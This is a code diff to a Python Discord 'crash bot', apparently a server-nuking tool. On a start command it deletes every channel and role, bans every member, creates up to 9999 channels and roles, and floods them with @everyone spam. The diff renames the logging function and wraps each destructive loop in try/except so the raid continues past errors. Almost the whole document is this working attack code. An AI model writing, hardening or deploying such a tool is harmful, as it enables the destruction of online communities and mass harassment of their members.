@@ -9,17 +9,17 @@ token = ""
 
 @client.event
 async def on_ready():
-    printf("Initialized.")
+    print_bot("Initialized.")
 
 @client.event
 async def on_guild_join(guild):
-    printf(f"Invited to `{guild.name}`")
+    print_bot(f"Invited to `{guild.name}`")
 
 
 @commands.has_permissions(ban_members=True)
 @client.command()
 async def start(ctx):
-    printf("Crash command executed!")
+    print_bot("Crash command executed!")
     await ctx.message.delete()
 
     with open('image.png') as image:
@@ -34,9 +34,9 @@ async def deleteChannels(ctx):
     for channels in ctx.guild.channels:
         try:
             await channels.delete(reason="Your Text")
-            printf(f"`{channels.name}` Has been deleted.")
+            print_bot(f"`{channels.name}` Has been deleted.")
         except:
-            printf(f"Unable to delete this channel `{channels.name}`")
+            print_bot(f"Unable to delete this channel `{channels.name}`.")
             pass
 
     create_task(createChannels(ctx))
@@ -46,9 +46,9 @@ async def deleteRoles(ctx):
     for role in ctx.guild.roles:
         try:
             await role.delete(reason="Your Text")
-            printf(f"`{role.name}` Has been deleted.")
+            print_bot(f"`{role.name}` Has been deleted.")
         except:
-            printf(f"This role `{role.name}` cannot be deleted.")
+            print_bot(f"This role `{role.name}` cannot be deleted.")
             pass
 
     create_task(createRoles(ctx))
@@ -56,30 +56,46 @@ async def deleteRoles(ctx):
 
 async def banAll(ctx):
     for member in ctx.guild.members:
-        await member.ban(reason="Your Text")
-        printf(f"`{member.name}` Has been banned.")
+        try:
+            await member.ban(reason="Your Text")
+            print_bot(f"`{member.name}` Has been banned.")
+        except:
+            print_bot(f"Can't ban this {member.name} member.")
+            pass
 
 async def createChannels(ctx):
     for channels in range(9999):
-        channel = await ctx.guild.create_text_channel('Your Text')
-        create_task(spamMessage(channel))
-        printf("Channel has been created.")
+        try:
+            channel = await ctx.guild.create_text_channel('Your Text')
+            create_task(spamMessage(channel))
+            print_bot("Channel has been created.")
+        except:
+            print_bot(f"Unable to create channel.")
+            pass
 
 
 async def createRoles(ctx):
     for roles in range(9999):
-        await ctx.guild.create_role(name="Your Text")
-        printf("Role created.")
+        try:
+            await ctx.guild.create_role(name="Your Text")
+            print_bot("Role created.")
+        except:
+            print_bot(f"Can't create role.")
+            pass
 
 
 async def spamMessage(channel):
     allowed_mentions = discord.AllowedMentions(everyone=True)
     for messages in range(9999):
-        await channel.send("Your Text", allowed_mentions=allowed_mentions)
-        printf("Message sent.")
+        try:
+            await channel.send("Your Text", allowed_mentions=allowed_mentions)
+            print_bot("Message sent.")
+        except:
+            print_bot(f"Unable to send message.")
+            pass
 
 
-def printf(text):
+def print_bot(text):
      print(f"[CRASH BOT]: {text}")
 
 
